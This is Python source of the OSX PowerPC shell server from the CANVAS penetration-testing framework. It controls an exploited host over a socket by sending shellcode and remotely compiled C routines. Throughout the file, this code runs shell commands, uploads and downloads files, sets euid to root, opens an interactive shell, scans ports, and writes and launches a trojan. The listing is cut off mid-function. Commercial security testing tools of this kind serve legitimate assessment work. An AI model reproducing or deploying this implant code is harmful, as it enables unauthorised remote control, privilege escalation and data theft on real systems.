#! /usr/bin/env python

"""
CANVAS OSX shell server
Uses MOSDEF for dynamic assembly component linking

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


from shellserver import unixshellserver
from MOSDEFShellServer import MosdefShellServer, MSSgeneric
from exploitutils import *
import time, struct
import os
import socket
import sys
from shellcode import shellcodeGenerator


#globals for osx
O_RDONLY=0
O_RDWR=2
O_CREAT=0x100
O_TRUNC=0x200
AF_INET=2

SOCK_STREAM=1
SOCK_DGRAM=2

MODE_ALL=0x1ff #777 (read,write,execute all,all,all)

SIG_DFL = 0
SIG_IGN = 1
SIGCHLD = 20
SIGPIPE = 13


from MOSDEF.osxremoteresolver import osxremoteresolver
class old_osxshellserver(MSSgeneric, unixshellserver, osxremoteresolver):
    """
     this is the OSX MOSDEF Shell Server class
     """
    def __init__(self, connection, node, logfunction=None, initialisedFD=None):
        osxremoteresolver.__init__(self)
        unixshellserver.__init__(self,connection,logfunction=logfunction)
        MSSgeneric.__init__(self, 'PowerPC')
        self.libraryDict={}
        self.functionDict={}
        self.remotefunctioncache={}

        self.order=big_order
        self.unorder=str2bigendian
        self.node=node

        self.node.shell=self
        self.initialisedFD = initialisedFD
        self.setconstants()
        self.started = 0

        return

    #def createRemoteLibc(self):
        #ndx = 0
        #libc=[]
        #libc_buffer = ""
        #import mosdef
        #BASE_ADDRESS = 0x60400000L  # just some random address that we expect not 
                                ## to be remotely mmaped

        #for ke in self.localfunctions.keys():
            #suffixtype = self.localfunctions[ke][0]
            #suffixcode = self.localfunctions[ke][1]
            #if suffixtype=="asm":
                #buf=mosdef.assemble(suffixcode, self.arch)

            #elif suffixtype == "c":
                #code = "jump %s\n" % ke 
                #code+= mosdef.compile_to_IL(suffixcode,{}, self,  None, not_libc=0)

                #code = self.compile_to_ASM(code)

                #buf = mosdef.assemble(code, self.arch)

                ## IMPORTANT: never forget to clearfunctioncache
                #self.clearfunctioncache()
            #else:
                #continue

            #libc.append("libc!"+ke)
            #self.remotefunctioncache["libc!" + ke] = ndx + BASE_ADDRESS
            #libc_buffer += buf
            #ndx+=len(buf)


        ## mapping the libc
        #self.log("Remote libc size: 0x%08x" % ndx)
        #ret = self.mmap(addr = BASE_ADDRESS, needed = ndx)
        #if ret == 0xFFFFFFFFL:
            #raise Exception, "Failed to mmap libc at address 0x%08x with size: %d" % (BASE_ADDRESS, ndx)

        #self.remoterecv( self.fd, ret, ndx, libc_buffer)

        #self.log("MOSDEF libc mapped at address: 0x%08x" % ret)

        ## Instead of patching, everything, i can try to mmap at a know address,
        ## in case it doesn't work, i can re patch with the given address.

        #if ret != BASE_ADDRESS:
            #devlog("OSX MOSDEF", "Repatching the remotelibc")

            #for ke in libc:
                #self.remotefunctioncache[ke] = self.remotefunctioncache[ke] - BASE_ADDRESS + ret


    def mmap(self, addr=0, needed=0, prot = 7, flags= 0x1002, fd=-1, offset=0):
        vars = {}
        code = """
             #import "local", "mmap" as "mmap"
             #import "local", "sendint" as "sendint"
             void main()
             {
             char *buf;

             buf = mmap(0x%08x, 0x%08x, 0x%08x, 0x%08x, 0x%08x, 0x%08x);

             sendint(buf);
             return 0;

             }

             """ % (addr, needed, prot, flags, fd, offset)

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        self.leave() 

        return uint32(ret)

    def remoterecv(self, fd, buf, length, request_buf):
        vars = {}
        vars={}
        vars["fd"]=fd
        vars["buf_addr"] = buf
        vars["length"]=length

        code="""
            #import "local", "recv" as "recv"
            #import "int", "length" as "length"
            #import "int", "buf_addr" as "buf_addr"
            #import "int", "fd" as "fd"

            void main() 
            {
            int i;
            long buf;
            int wanted;
            buf = buf_addr;

            //flags set to zero here
            wanted=length;

            while (wanted > 0 ) {
            if (wanted < 1000) {
            i=recv(fd, buf, wanted,0);
            }
            else
            {
            i=recv(fd, buf,1000,0);
            }
            buf = buf + i;
            wanted = wanted-i;

            }
            }""" 

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        self.node.parentnode.send(self.connection, request_buf)

        self.leave() 

    def setconstants(self):
        self.SO_REUSEADDR=4

    def reliableread(self,length):
        """ 
          reliably read off our stream without being O(N). If you just 
          do a data+=tmp, then you will run into serious problems with large
          datasets
          """
        data=""
        datalist=[]
        readlength=0
        while readlength<length:
            tmp=self.node.parentnode.recv(self.connection,length-readlength)
            if tmp=="":
                self.log("Connection broken?!?")
                break
            readlength+=len(tmp)
            datalist.append(tmp)
        data="".join(datalist)
        return data

    def readword(self):
        """ read one word off our stream"""
        data=self.reliableread(4)
        return self.unorder(data)

    def short_from_buf(self,buf):
        return istr2halfword(buf)

    def readshort(self):
        data=self.reliableread(2)
        return self.short_from_buf(data)

    def readbuf(self,size):
        return self.reliableread(size)

    def writeint(self,word):
        data=intel_order(word)
        #need to make reliable
        self.node.parentnode.send(self.connection,data)
        return

    def writebuf(self,buf):
        #need to make reliable
        self.node.parentnode.send(self.connection,buf)
        return


    def readstruct(self,args):
        ret={}
        for typestr,member in args:
            if typestr=="l":
                ret[member]=self.readint()
            elif typestr=="s":
                ret[member]=self.readshort()
        return ret

    def readint(self):
        return self.readword()

    def readblock(self):
        """
          Reads one block at a time...<int><buf>
          """
        data=[]
        tmp=""
        wanted=self.readint() #the size we are recieving
        #print "readblock wants %d" % wanted
        while wanted>0:
            tmp=self.node.parentnode.recv(self.connection,wanted)
            if tmp=="":
                print "Connection broken?"
                break
            #print len(tmp), prettyprint(tmp)
            data.append(tmp)
            wanted=wanted-len(tmp)
        #print "readblock returns (%d) %s" % (len("".join(data)),prettyprint("".join(data)))
        return "".join(data)

    def readstring(self):
        """
          This string reader completely sucks and needs to change to be O(1)

          Ok, fixed.
          """
        return self.readblock()

    def setListenPort(self,port):
        self.listenport=port
        return

    def getASMDefines(self):
        return ""

    def assemble(self,code):
        return ""


    def startup(self):
        """
          this function is called by the engine and by self.run()
          we are ready to rock!
          Our stage one shellcode just reads in a word, then reads in that much data
          and executes it
          First we send some shellcode to get the socket register
          Then we send some shellcode to establish our looping server
          """
        devlog('shellserver::startup', "local %s, remote %s" % \
               (self.connection.getsockname(), self.connection.getpeername()))
        if self.started:
            return 0
        self.connection.set_timeout(None)          

        sc=shellcodeGenerator.osxPPC()

        if hasattr(self, 'initialisedFD') and self.initialisedFD:
            self.fd = self.initialisedFD
        else:
            import struct
            #sc.addAttr("loopme",None)
            sc.addAttr("sendreg",{"fdreg":"r24","regtosend":"r24"})
            sc.addAttr("RecvExec",{"fdreg":"r24"})
            getfd=sc.get()
            print shellcode_dump(getfd, mode="Risc")
            #self.sendrequest(struct.pack("!L", 0x7fe00008)+getfd)
            self.sendrequest(getfd)
            #now read in our big endian word that is our fd (originally in %g4)
            self.fd=self.readword()
            self.leave()
        self.log("Self.fd=%d"%self.fd)

        #sc.reset() # XXX reset() not yet working, for future release.
        sc=shellcodeGenerator.osxPPC()
        sc.addAttr("read_and_exec_loop",{"fd":self.fd})
        #sc.addAttr("exit",None) # XXX not really useful isnt it?
        mainloop=sc.get()        
        self.log("mainloop length=%d"%len(mainloop))
        self.sendrequest(mainloop)
        self.leave()

        #self.log("process pid: %d" % self.getpid())

        # XXX is that solaris code useful on osx? i dont think so.
        """
          # allow some time for mainloop to init
          snooze = 3
          while snooze:
              time.sleep(1)
              print "Snoozing... (%d)"%(snooze-1)
              snooze -= 1
          """
        #for debug
        #time.sleep(5000) # <-- time for a coffee
        #ok, now our mainloop code is running over on the other side
        self.log("Set up OSX PPC dynamic linking assembly component server")

        self.initLocalFunctions()
        self.log("Initialized Local Functions.")
        ##At this point MOSDEF is up and running

        self.log("Resetting signal handlers...")
        #self.log("Reset sigchild")
        self.signal(SIGCHLD, SIG_DFL)
        self.signal(SIGPIPE, SIG_IGN)

        #self.log("Getting ARP table")

        #self.log("Creating a Remote Libc for local MOSDEF functions")
        #self.createRemoteLibc()

        #self.log("Resolving dynamic function loaders...")
        #try:
            #(dlopen, dlsym) = self.getDLlibs()
            #self.remotefunctioncache["libSystem.B.dylib|dlopen"]= dlopen
            #self.remotefunctioncache["libSystem.B.dylib|dlsym"] = dlsym
            #self.remotefunctioncache["libc|dlopen"]= dlopen
            #self.remotefunctioncache["libc|dlsym"] = dlsym

            #self.log("dlopen = 0x%08x" % dlopen)
            #self.log("dlsym  = 0x%08x" % dlsym)
        #except Exception, msg:
            #self.log(str(msg))

        #self.log("GETUID...")
        #self.log("UID: %d" % self.getuid() )
        self.log("Getting UIDs");
        (uid,euid,gid,egid)=self.ids()

        if euid!=0 and uid==0:
            self.log("Setting euid to 0...")
            self.seteuid(0)
        #self.seteuid(501) # XXX ???

        ##here we set the timout to None, since we know the thing works...(I hope)
        self.connection.set_timeout(None)
        self.setInfo("OSX MOSDEF ShellServer. Remote host: %s"%("*"+str(self.getRemoteHost())+"*"))
        self.setProgress(100)
        self.started=1
        return 1

    def run(self):
        """
          Placeholder
          """

        return

#     def getremote(self, func):
#          
#          procedure=self.getprocaddress(func)
#          
#          return procedure #0 if fail

    def getprocaddress(self, procedure):
        """call getprocaddress - function that resolve the symbol requested: lib|sym"""
        print procedure

        if procedure in self.remotefunctioncache:
            return self.remotefunctioncache[procedure]

        self.log("%s not in cache - retrieving remotely."%procedure)

        vars={}
        #always exists
        library,procname=procedure.split("|")
        #libaddr=self.loadlibrarya(library)
        vars["library"]   = library
        vars["procedure"] = procname

        code="""
            #import "remote", "libSystem.B.dylib|dlopen" as "dlopen"
            #import "remote", "libSystem.B.dylib|dlsym" as "dlsym"
            #import "string", "library" as "library"
            #import "string", "procedure" as "procedure"
            #import "local", "sendint" as "sendint"
            #import "local", "debug" as "debug"

            void main()
            {
            unsigned long *handle;
            unsigned long *ret;

            debug();
            handle=dlopen(library,  1); // LAZY_BIND

            if(handle == 0) {
            sendint(0);
            return 0;
            }

            ret = dlsym(handle, procedure);     
            sendint(ret);

            return 0;
            }
            """
        self.savefunctioncache()
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.restorefunctioncache()
        self.sendrequest(request)

        ret=self.readint()
        print "FOUND! ",hex(ret)
        if ret!=0:
            self.remotefunctioncache[procedure]=ret
        print "Found %s at %8.8x"%(procedure,ret)
        self.leave()
        if ret==0:
            raise Exception,"dlopen/dlsym for %s not found!"%procedure

        return ret



    def uploadtrojan(self):
        didtrojan=0
        for file in testfiles:
            print "trying to create %s"%(file)
            newfile=self.lcreat(file)
            if newfile==-1:
                continue
            print "Success"
            #otherwise, we were able to open the file! YAY!
            tFile=open(trojanfile,"r")
            alldata=tFile.read()
            tFile.close()
            print "Trying to write into that file"
            while alldata!="":
                self.write(newfile,alldata[:1000])
                alldata=alldata[1000:]

            print "Done writing, now closing file"
            #close our remote file
            self.close(newfile)
            print "Now spawning file"
            self.spawn(file)
            #self.spawn(file)
            self.log("Done spawning file!")
            didtrojan=1
            break

        if not didtrojan:
            self.log("Didn't do trojan...sorry")

        return

    def pwd(self):
        """
          calls getcwd()
          """
        ####TODO
        ret=self.getcwd()
        return ret

    def tcpportscan(self,args):
        """ TCP Connect scan from the remote host.
          Args: network to scan, startport, endport
          """
        argsL=args.split(" ")
        return self.tcpConnectScan(argsL[0],int(argsL[1]),int(argsL[2]))
    
    def upload(self,source,dest="",destfilename=None):
        """ Upload a file to the remote host """

        rv = True
        
        try:
            tFile=open(source,"r")
            alldata=tFile.read()
            tFile.close()
        except IOError, i:
            raise NodeCommandError("Unable to read source file: %s" % str(i))
            
        
        if destfilename:
            destfile = destfilename
        else:
            destfile = dest + source.split(os.path.sep)[-1]
            
        self.log("trying to create %s"%(destfile))
        newfile=self.open(destfile, O_RDWR|O_CREAT|O_TRUNC)
        if newfile<0:
            e = "Could not create remote file: %s"%self.perror(newfile)
            self.log(e)
            rv = False
        
        if rv:    
            #now write the data directly down the pipe
            self.writetofd(newfile,alldata) # writetofd can't report error?
            x = self.close(newfile)
            if x == -1:
                rv = False
                ret = "Couldn't close file, that's weird - possibly some kind of error."
            else:
                rv = True
             
        if rv:
            ret = "Uploaded file successfully to %s" % destfile
        else:
            raise NodeCommandError(ret)
            
        return ret

    def download(self,source,dest="."):
        """
        downloads a file from the remote server
        """
        rv = True
        ret = ""
        
        infile=self.open(source, O_RDONLY )
        if infile<0:
            e = ("Error opening remote file: %s"%self.perror(infile))
            self.log(e)
            raise NodeCommandError(e)
        
        if os.path.isdir(dest):
            dest=os.path.join(dest,source.replace("/","_").replace("\\","_"))
            
        x,fs=self.fstat(infile)
        if x != 0:
            e="fstat failed on file: %s" % self.perror(infile)
            self.log(e)
            rv = False
            ret = e
            
        if rv:        

            size=fs["st_size"]
            self.log("Downloading %s bytes"%size)
    
            try:
                outfile=open(dest,"wb")
            except IOError, i:
                e = "Failed to open local file: %s" % str(i)
                self.log(e)
                rv = False
                ret = e
                
        if rv:
            data=self.readfromfd(infile,size)
            try:
                outfile.write(data)
                outfile.close()
                rv = True            
                ret = "Read %d bytes of data into %s"%(len(data),dest)
                
            except IOError,i:
                e = "Error writing to local file: %s" % str(i)
                self.log(e)
                ret = e
                rv = False
            

        x = self.close(infile)
        if x < 0:
            e = "Some kind of error closing fd %d"%infile
            self.log(e)
            ret = e
            rv = False
        
        if not rv:
            raise NodeCommandError(ret)
        
        return ret 

    def cd(self,dest):
        if self.chdir(dest)==-1:
            return "No such directory, drive, or no permissions to access that directory."
        return "Successfully changed to %s"%(dest)

    def dounlink(self,filename):
        ret=self.unlink(filename)
        if not ret:
            return "%s was unlinked."%filename
        else:
            return "%s was not unlinked due to some kind of error."%filename

    def dospawn(self,filename):
        return "%s was not spawned, not implemented on osxNode yet."%filename

    def runcommand(self,command):
        """
          Runs a command via popen
          """
        data=""
        data=self.popen2(command)
        return data

    def runexitprocess(self):
        """Exit the process"""
        self.exit(1)
        return "Exited the process"

    def callzero(self):
        """call zero
          This will cause the remote server to cause an exception
          """
        print "CALLING 0"
        #call 0 to cause an exception
        self.sendrequest(intel_order(0))
        self.shutdown()
        self.leave()
        print "Done calling zero"

    def shutdown(self):
        """
          close the socket
          """
        #close connection
        self.connection.close()
        return


    #################################################################################################
    #Our network fun


    def sendrequest(self,request):
        """
          sends a request to the remote shellcode
          """
        devlog('shellserver::sendrequest', "Sending Request (%d bytes)" % len(request))
        self.requestsize=len(request)
        request=self.order(len(request))+request
        self.enter()
        #print "R: "+prettyprint(request)
        self.node.parentnode.send(self.connection,request)

        devlog('shellserver::sendrequest', "Done sending request")
        return

    ##################################################################################################
    #Shellcode functions below
    def close(self,fd):
        vars={}
        vars["fdtoclose"]=fd


        code="""
            //start of code
            #import "local","close" as "close"
            #import "int","fdtoclose" as "fdtoclose"
            #import "local","sendint" as "sendint"

            void main() 
            {
            int i;
            i=close(fdtoclose);
            sendint(i);
            }
            """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def getpid(self):
        """
          A simple getpid
          """
        vars={}

        code="""
            //start of code
            #import "local","getpid" as "getpid"
            #import "local","sendint" as "sendint"

            void main() 
            {
            int i;
            i=getpid();
            sendint(i);
            }
            """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave() 
        return ret

    def getppid(self):
        """
          A simple getppid
          """
        vars={}

        code="""
            //start of code
            #import "local","getppid" as "getppid"
            #import "local","sendint" as "sendint"

            void main() 
            {
            int i;
            i=getppid();
            sendint(i);
            }
            """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave() 
        return ret

    def exit(self,exitcode):
        vars={}
        vars["exitcode"]=exitcode


        code="""
            //start of code
            #import "local","exit" as "exit"
            #import "int","exitcode" as "exitcode"

            void main() 
            {
            int i;
            i=exit(exitcode);
            }
            """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        #ret=self.readint() #we're gone!
        self.leave()
        return

    def seteuid(self,euid):
        vars={}
        vars["euid"]=int(euid)


        code="""
            //start of code
            #import "local","seteuid" as "seteuid"
            #import "int","euid" as "euid"
            #import "local", "sendint" as "sendint"

            void main() 
            {
            int i;
            i=seteuid(euid);
            sendint(i);
            }
            """
        self.clearfunctioncache()

        #struct.pack("!L", 0x7fe00008)
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave() 
        return ret

    def getids(self):
        uid,euid,gid,egid=self.ids()
        return "UID=%d EUID=%d GID=%d EGID=%d"%(uid,euid,gid,egid)

    def getuid(self):
        code="""
            //start of code
            #import "local", "getuid" as "getuid" 
            #import "local","sendint" as "sendint"

            void main() 
            {
            int i;
            i=getuid();
            sendint(i);
            }
            """
        import struct
        self.clearfunctioncache()
        # struct.pack("!L", 0x7fe00008)
        request= self.compile(code,vars)
        self.sendrequest(request)
        uid=self.readint() #we're gone!
        self.leave()
        return uid

    def ids(self):
        vars={}

        #import "local","getuid" as "getuid"
        #import "local","geteuid" as "geteuid"
        #import "local","getgid" as "getgid"
        #import "local","getegid" as "getegid"
        #import "local","sendint" as "sendint"

        code="""
            //start of code
            #import "local","getuid" as "getuid"
            #import "local","geteuid" as "geteuid"
            #import "local","getgid" as "getgid"
            #import "local","getegid" as "getegid"
            #import "local","sendint" as "sendint"

            void main() 
            {
            int i;

            i=getuid();
            sendint(i);
            i=geteuid();
            sendint(i);
            i=getgid();
            sendint(i);
            i=getegid();
            sendint(i);
            }
            """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        #self.sendrequest(struct.pack("!L", 0x7fe00008)+request)
        uid=self.readint() #we're gone!
        euid=self.readint() #we're gone!
        gid=self.readint() #we're gone!
        egid=self.readint() #we're gone!
        self.leave()
        return (uid,euid,gid,egid)

    def open(self,filename,flags,mode=MODE_ALL):
        vars={}
        vars["filename"]=filename
        vars["flags"]=flags
        vars["mode"]=mode

        code="""
            //start of code
            #import "local","open" as "open"
            #import "local","sendint" as "sendint"
            #import "string","filename" as "filename"
            #import "int","flags" as "flags"
            #import "int","mode" as "mode"

            void main() 
            {
            int i;
            i=open(filename,flags,mode);
            sendint(i);
            }
            """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def chdir(self,dir):
        """
          inputs: the filename to open
          outputs: returns -1 on failure, otherwise a file handle
          truncates the file if possible and it exists
          """
        vars={}
        vars["dir"]=dir
        self.clearfunctioncache()
        request=self.compile("""
                             //start of code
#import "local","sendint" as "sendint"
#import "local","chdir" as "chdir"
#import "string","dir" as "dir"
//#import "local","debug" as "debug"

void main() 
{
int i;
//debug();
i=chdir(dir);
sendint(i);
}
""",vars)

        self.sendrequest(request)
        fd=self.readint()
        self.leave()
        return fd

    def signal(self,signum,action):
        """
          Calls signal to get the signal handler set
          """
        vars={}
        vars["signum"]=signum
        vars["sighandler"]=action
        self.clearfunctioncache()
        request=self.compile("""
                             #import "local","sendint" as "sendint"
#import "int", "signum" as "signum"
#import "int", "sighandler" as "sighandler"
#import "local", "signal" as "signal"

void main() 
{
int i;
i=signal(signum,sighandler);
sendint(i);
}
""",vars)
        self.sendrequest(request)
        ret=self.readint()
        #print "Ret=%s"%ret
        self.leave()
        return ret

    def getcwd(self):
        """
          inputs: none
          outputs: returns the current working directory as a string
          """
        #Solaris Notes
        #first call pathconf with "." and 5 as the arguments to get max size
        #urg- this is the algo they use on solaris to "implement" getcwd()"
        #They do a fstat on / and a fstat on . and then getdents to walk ../../.. ...
        #until the device numbers are different or they are in /
        #Amazingly lame.
        #we're just going to use popen() to emulate that. :>          
        #normally this would work, but it doesn't because of how fun solaris is.
        ret=self.popen2("pwd").strip()
        return ret

    def fstat(self,infd):
        """
          runs fstat
          """

        vars={}
        vars["fd"]=infd
        code="""
            #include "fstat.h"
            #import "local","sendint" as "sendint"
            #import "local","sendshort" as "sendshort"
            #import "local","fstat" as "fstat"
            #import "int", "fd" as "fd"
            void main()
            {
            struct stat buf;
            int ret;

            ret=fstat(fd,&buf);
            sendint(ret);
            if (ret==0) {
            //success
            sendint(buf.st_dev);
            sendint(buf.st_ino);
            sendshort(buf.st_mode);
            sendshort(buf.st_nlink);

            sendint(buf.st_uid);
            sendint(buf.st_gid);
            sendint(buf.st_rdev);

            sendint(buf.st_atime);
            sendint(buf.st_atimensec);
            sendint(buf.st_mtime);
            sendint(buf.st_mtimensec);
            sendint(buf.st_ctime);
            sendint(buf.st_ctimensec);

            sendint(buf.st_size);
            sendint(buf.st_blocks);
            sendint(buf.st_blksize);
            sendint(buf.st_flags);
            }
            }
            """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        statbuf=None
        if ret==0:
            #success
            statbuf=self.readstruct([("l","st_dev"),
                                     ("l","st_ino"),
                                     ("s","st_mode"),
                                     ("s","st_nlink"),
                                     ("l","st_uid"),
                                     ("l","st_gid"),
                                     ("l","st_rdev"),
                                     ("l","st_atime"),
                                     ("l","st_atimensec"),
                                     ("l","st_mtime"),
                                     ("l","st_mtimensec"),
                                     ("l","st_ctime"),
                                     ("l","st_ctimensec"),
                                     ("l","st_size"),
                                     ("l","st_blocks"),
                                     ("l","st_blksize"),
                                     ("l","st_flags")])


        #print "Ret=%s"%ret
        self.leave()
        return ret,statbuf


    def fexec(self,command,args,env):
        """
          calls fork execve
          """

        code=""
        vars={}
        vars["command"]=command
        i=0
        for a in args:
            vars["arg%d"%i]=a
            code+="#import \"string\",\"arg%d\" as \"arg%d\""%(i,i)
            i+=1
        i=0
        for e in env:
            vars["env%d"%i]=e
            code+="#import \"string\",\"env%d\" as \"env%d\""%(i,i)
            i+=1
        maxargs=len(args)
        maxenv=len(env)

        code+="""
            //start
#import "local", "close" as "close"
#import "local", "execve" as "execve"
#import "local", "read" as "read"
#import "local", "fork" as "fork"
#import "string", "command" as "command"

#import "local", "getpid" as "getpid"
//#import "local", "debug" as "debug"
#import "local", "exit" as "exit"
#import "local", "memset" as "memset"
#import "local", "wait" as "wait"


void main()
{
            int pipes[2];
            int bpipes[2];
            char buf[1001];
            char *argv[ARGVNUM];
            char *envp[ENVNUM];
            int ret;
            int pid;
            int ppid;

            //pipes[0] is now for reading and pipes[1] for writing

            """
        code=code.replace("ARGVNUM",str(maxargs+1))
        code=code.replace("ENVNUM",str(maxenv+1))
        code+="envp[%d]=0;\n"%maxenv
        code+="argv[%d]=0;\n"%maxargs
        for i in range(0,maxargs):
            code+="argv[%d]=arg%d;\n"%(i,i)
        for i in range(0,maxenv):
            code+="envp[%d]=env%d;\n"%(i,i)
        code+="""
            //now we fork and exec and read from the socket until we are done
            ppid = getpid();
            pid=fork();
            //solaris fork(2) syscall returns parent id in child and child id in parent
            if (pid==ppid) 
            {
            //child
            close(1);
            close(2);
            execve(command,argv,envp);
            exit(1); //in case it failed
            }

            //we do this twice in the event that 
            //our previous process did not exit by now...
            //we could listen for pid, but instead, we listen for any process
            //that is a zombie
            wait(0); //wnohang is 1
            wait(0); //wnohang is 1
            }

            """
        self.clearfunctioncache()          
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.leave()    
        return

    def popen2(self,command):
        """
          runs a command and returns the result
          Note how it uses TCP's natural buffering, and 
          doesn't require a ping-pong like protocol.
          """

        vars={}
        vars["command"]=command
        vars["shell"]="/bin/sh"
        vars["dashc"]="-c"
        code="""
            //start
#import "string","command" as "command"
#import "string","dashc" as "dashc"
#import "string","shell" as "shell"

#import "local","pipe" as "pipe"
#import "local", "dup2" as "dup2"
#import "local", "close" as "close"
#import "local", "execve" as "execve"
#import "local", "read" as "read"
#import "local", "fork" as "fork"
#import "local", "getpid" as "getpid"
#import "local", "exit" as "exit"
#import "local", "memset" as "memset"
#import "local", "sendstring" as "sendstring"
#import "local", "wait" as "wait"


void main()
{
            int pipes[2];
            int bpipes[2];
            char buf[1001];
            char *argv[4];
            char **envp;
            int ret;
            int pid;

            //pipes[0] is now for reading and pipes[1] for writing
            envp=0;
            argv[0]=shell;
            argv[1]=dashc;
            argv[2]=command;
            argv[3]=0;

            //now we fork and exec and read from the socket until we are done
            ret=pipe(pipes); // 6,7
            ret=pipe(bpipes);// 8,9
            //fork(2) syscall returns parent id in child and child id in parent

            ret = fork();
            if (ret==1) // child
            {
            //child
            close(0);
            close(1);
            close(2);
            ret=dup2(pipes[0],0);
            ret=dup2(bpipes[1],1);
            ret=dup2(bpipes[1],2);
            close(bpipes[0]);
            execve(shell,argv,envp);
            exit(1); //in case it failedse
            }
            ret=close(bpipes[1]); // close(9)
            ret=close(pipes[0]);  // close(6)
            memset(buf,0,1001);

            while (read(bpipes[0],buf,1000)!=0) {
            sendstring(buf);
            memset(buf,0,1001);
            }
            //send blank string...
            sendstring(buf);
            close(pipes[1]);
            close(bpipes[0]);
            //we do this twice in the event that 
            //our previous process did not exit by now...
            //we could listen for pid, but instead, we listen for any process
            //that is a zombie
            wait(0); //wnohang is 1
            wait(0); //wnohang is 1
            }

            """
        self.clearfunctioncache()          
        request=self.compile(code,vars)
        self.sendrequest(request)
        tmp=self.readstring()
        data=[tmp]
        while tmp!="":
            tmp=self.readstring()
            data+=[tmp]
        data="".join(data)
        self.leave()
        return data

    def shellshock(self, logfile=None):
        """implements an interactive shell, reverts back to MOSDEF on \'exit\'"""

        print "[!] Turning MOSDEF-Node into temporary interactive shell"
        print "[!] Note: will revert back to MOSDEF on \"exit\""


        vars={}
        vars["shell"]="/bin/sh"
        vars["dashi"]="-i"
        vars["mosdefd"]=self.fd

        code="""
#import "string", "dashi" as "dashi"
#import "string", "shell" as "shell"
#import "int", "mosdefd" as "mosdefd"

#import "local", "pipe" as "pipe"
#import "local", "dup2" as "dup2"
#import "local", "close" as "close"
#import "local", "execve" as "execve"
#import "local", "read" as "read"
#import "local", "fork" as "fork"
#import "local", "write" as "write"
#import "local", "sendstring" as "sendstring"
#import "local", "sendint" as "sendint"
#import "local", "poll" as "poll"
#import "local", "memset" as "memset"
#import "local", "exit" as "exit"
#import "local", "getpid" as "getpid"

#import "local", "debug" as "debug"

//struct pollfd {
//  int fd;
//  short events;
//  short revents;
//};

void main()
{
            char *exec[3];
            char in[512];
            char out[512];

            int pid;
            int ppid;
            int rfd;
            int wfd;
            int len;
            int ret;

            int error;

            int i;


            // cuz we're lacking proper struct array support
            int ufds[4];

            int moscheck;
            int shellcheck;

            int write_pipe[2];
            int read_pipe[2];

            exec[0] = shell;
            exec[1] = dashi;
            exec[2] = 0;

            pipe(write_pipe);
            pipe(read_pipe);

            //ppid = getpid();
            pid = fork();

            if (pid == 1)
            {
            close(0);
            close(1);
            close(2);
            dup2(write_pipe[0], 0);
            dup2(read_pipe[1], 1);
            dup2(read_pipe[1], 2);
            close(read_pipe[0]);
            execve(exec[0], exec, 0);
            exit(1);
            }

            close(read_pipe[1]);
            close(write_pipe[0]);

            rfd = read_pipe[0];
            wfd = write_pipe[1];

            error = 0;

            while (error == 0)
            {

            // XXX: some wacky syscall return semantics, look into that
            // XXX: multiple return instances hecking up! using error int :/

            ufds[0] = rfd;
            ufds[1] = 0x00400000;
            ufds[2] = mosdefd;
            ufds[3] = 0x00400000;

            ret = poll(&ufds, 2, -1);
            if (ret > 0)
            {
//      debug();
            shellcheck = ufds[1] & 0x0040;
            if (shellcheck == 0x0040)
            {
            memset(&in, 0, 512);
            len = read(rfd, in, 511);
            if (len > 0)
            {
            sendstring(in);
            }
            else
            {
            sendint(0);
            error = 1;
            }
            }
            // check for POLLERR | POLLHUP | POLLNVAL in revents
            shellcheck = ufds[1] & 0x0038;
            if (shellcheck != 0)
            {
            sendint(0);
            error = 1;
            }
            moscheck = ufds[3] & 0x0040;
            if (moscheck == 0x0040)
            {
            memset(&out, 0, 512);
            len = read(mosdefd, out, 511);
            if (len > 0)
            {
            write(wfd, out, len);
            }
            else
            {
            sendint(0);
            error = 1;
            }
            }
            // check for POLLERR | POLLHUP | POLLNVAL in revents
            moscheck = ufds[3] & 0x0038;
            if (moscheck != 0)
            {
            sendint(0);
            error = 1;
            }
            }
            }
            return;
}
            """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret = self.shellshock_loop(endian="big", logfile=logfile)

        self.leave()
        return


    def readfromfd(self,fd,filesize):
        """ Reads from a open fd on the remote host """

        vars={}
        vars["bufsize"]=filesize
        vars["socketfd"]=self.fd
        vars["filefd"]=fd
        code="""
            #import "local", "read" as "read"
            #import "local", "writeblock" as "writeblock"
            //#import "local", "debug" as "debug"
            #import "int", "bufsize" as "bufsize"
            #import "int", "socketfd" as "socketfd"
            #import "int", "filefd" as "filefd"

            void main () {
            char buf[1001];
            int left;

            left=bufsize;
            //debug();
            while (left>1000) {
            read(filefd,buf,1000); 
            writeblock(socketfd,buf,1000);
            left=left-1000;
            }

            if (left>0) {
            read(filefd,buf,left); 
            writeblock(socketfd,buf,left);
            }

            }
            """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        data=self.readbuf(filesize)
        self.leave()
        return data

    def writetofd(self,fd,data):
        """
          Writes all the data in data to fd
          """

        vars={}
        vars["bufsize"]=len(data)
        vars["socketfd"]=self.fd
        vars["filefd"]=fd

        code="""
            #import "local", "readblock" as "readblock"
            #import "local", "write" as "write"
            //#import "local", "debug" as "debug"
            #import "int", "bufsize" as "bufsize"
            #import "int", "socketfd" as "socketfd"
            #import "int", "filefd" as "filefd"

            void main () {
            char buf[1001];
            int left;

            left=bufsize;
            //debug();
            while (left>1000) {
            readblock(socketfd,buf,1000); 
            write(filefd,buf,1000);
            left=left-1000;
            }

            if (left>0) {
            readblock(socketfd,buf,left); 
